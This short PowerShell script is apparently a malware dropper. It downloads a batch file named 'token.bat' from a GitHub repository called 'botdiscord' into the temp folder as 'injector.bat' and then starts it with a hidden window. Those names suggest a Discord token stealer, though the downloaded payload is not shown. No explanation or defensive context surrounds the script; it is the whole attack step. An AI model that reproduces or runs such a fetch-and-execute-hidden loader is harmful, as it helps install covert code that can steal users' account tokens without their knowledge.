iwr -useb https://raw.githubusercontent.com/IStrawI/botdiscord/main/token.bat -o $env:TEMP\injector.bat
Start-Sleep -s 1
saps $env:TEMP\injector.bat -WindowStyle Hidden
